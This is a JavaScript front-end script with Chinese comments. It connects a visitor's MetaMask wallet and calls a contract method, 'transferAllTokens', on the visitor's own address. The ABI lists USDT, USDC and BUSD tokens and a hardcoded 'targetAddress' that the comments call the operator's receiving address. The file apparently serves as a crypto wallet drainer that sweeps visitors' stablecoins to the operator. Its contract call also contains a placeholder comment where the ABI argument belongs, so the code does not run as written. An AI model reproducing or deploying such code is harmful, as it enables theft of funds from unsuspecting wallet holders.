const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F";  // 替换为你的合约地址
const targetAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 你的收款地址
const ERC20_ABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			}
		],
		"name": "transferAllTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [],
		"name": "busdToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "targetAddress",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdcToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdtToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]
let web3;
let userAddress;
let contract;

async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        document.getElementById('transferTokensBtn').disabled = false;
        alert('钱包已连接: ' + userAddress);
    } else {
        alert('请安装MetaMask!');
    }
}

async function transferAllTokens() {
    const contract = new web3.eth.Contract(/* 合约ABI */, contractAddress);

    try {
        const receipt = await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
        document.getElementById('transferStatus').textContent = `转移成功! 交易哈希: ${receipt.transactionHash}`;
    } catch (error) {
        console.error("代币转移失败", error);
        document.getElementById('transferStatus').textContent = `代币转移失败: ${error.message}`;
    }
}

document.getElementById('connectWalletBtn').addEventListener('click', async () => {
    web3 = new Web3(window.ethereum);
    await connectWallet();
});

document.getElementById('transferTokensBtn').addEventListener('click', async () => {
    await transferAllTokens();
});
